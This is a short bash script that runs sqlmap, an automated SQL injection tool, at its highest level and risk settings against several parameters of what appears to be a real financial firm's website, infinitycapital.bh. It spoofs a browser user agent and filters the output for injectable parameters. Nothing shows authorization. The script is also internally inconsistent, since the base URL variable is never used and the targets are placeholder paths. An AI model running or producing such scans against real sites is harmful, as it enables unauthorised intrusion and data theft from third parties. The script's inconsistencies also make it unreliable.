#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
B=https://www.infinitycapital.bh
mkdir -p /tmp/sq
run () {
  echo "##### sqlmap $1"
  sqlmap -u "$1" $3 --batch --level=5 --risk=3 --threads=4 --timeout=15 --retries=1 \
    --user-agent="$UA" --output-dir=/tmp/sq --technique=BEUSTQ --dbms= --random-agent=0 \
    -p "$2" 2>&1 | grep -Ei "is vulnerable|injectable|parameter .* appears|not injectable|does not seem|back-end DBMS|sqlmap identified|^$" | head -8
  echo
}
run "HOME/page"  "page"  ""
run "HOME/id"    "id"    ""
run "CONTACT/cb" "cb"    ""
run "CONTACT/q"  "q"     "--technique=BEUSTQ"
run "API/id"     "id"    ""
echo "=== done ==="
